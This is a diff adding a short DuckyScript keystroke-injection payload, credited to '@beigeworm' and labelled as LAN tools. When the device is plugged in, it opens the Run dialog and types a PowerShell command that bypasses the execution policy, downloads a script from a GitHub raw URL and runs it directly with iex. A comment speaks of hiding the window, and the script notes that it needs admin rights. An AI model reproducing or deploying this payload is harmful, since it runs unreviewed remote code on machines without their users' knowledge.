@@ -1,0 +1,15 @@
+REM Title: beigeworm's LAN Tools
+REM Author: @beigeworm
+REM Description: Start up a HTTP server and run a selection of Local Area Network Tools using Powershell.
+REM NOTE - This script will need Admin privileges to run properly.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -C irm https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1 | iex
+ENTER
+
